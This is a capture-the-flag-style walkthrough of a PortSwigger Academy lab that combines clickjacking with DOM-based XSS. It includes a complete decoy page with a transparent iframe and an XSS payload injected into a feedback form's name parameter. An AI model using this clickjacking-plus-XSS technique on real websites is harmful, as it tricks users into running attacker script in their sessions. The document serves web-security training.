- So far, we have looked at clickjacking as a self-contained attack. Historically, clickjacking has been used to perform behaviors such as boosting "likes" on a Facebook page.
- The true potency of clickjacking is revealed when it is used as a carrier for another attack such as a [DOM XSS](https://portswigger.net/web-security/cross-site-scripting/dom-based) attack.
- Implementation of this combined attack is relatively straightforward assuming that the attacker has first identified the [XSS](https://portswigger.net/web-security/cross-site-scripting) exploit.
- The XSS exploit is then combined with the iframe target URL so that the user clicks on the button or link and consequently executes the DOM XSS attack.

## Steps to solve lab - 
### Title - Exploiting clickjacking vulnerability to trigger DOM-based XSS

**Desc** - This lab contains an [XSS](https://portswigger.net/web-security/cross-site-scripting) vulnerability that is triggered by a click. Construct a [clickjacking attack](https://portswigger.net/web-security/clickjacking) that fools the user into clicking the "Click me" button to call the `print()` function.


1. Log in to your account on the target website.
  ![[clickjacking2.png]]

2. After visiting every end-point, I got a end-point that seems suspecious.
![[clickjacking20.png]]

3. I try to analyze this page and it reflects the name in the web page that seems to be a posible DOM XSS vulnerability.
![[clickjacking19.png]]

4. I try to exploit this using the payload and it works.
![[clickjacking21.png]]

5. Copy and paste the below payload in the exploit server.
```js
	<style>
		#target_website {
			position: relative;
			width: 600px;
			height: 600px;
			opacity: 0.1;
			z-index: 2;
			}
		#decoy_website {
			position: absolute;
			z-index: 1;
			top: 448px;
			left: 73px;
			}
	</style>
	<div id="decoy_website">
	Click Me
	</div>
	<iframe scrolling="no" id="target_website" src="https://0aee002a04abf96f80f4806500ed001d.web-security-academy.net/feedback/?name=<img src=0 onerror=print()>&email=email@gmail.com&subject=nothing&message=nothing" sandbox="allow-forms" >
	</iframe>
```

![[clickjacking22.png]]

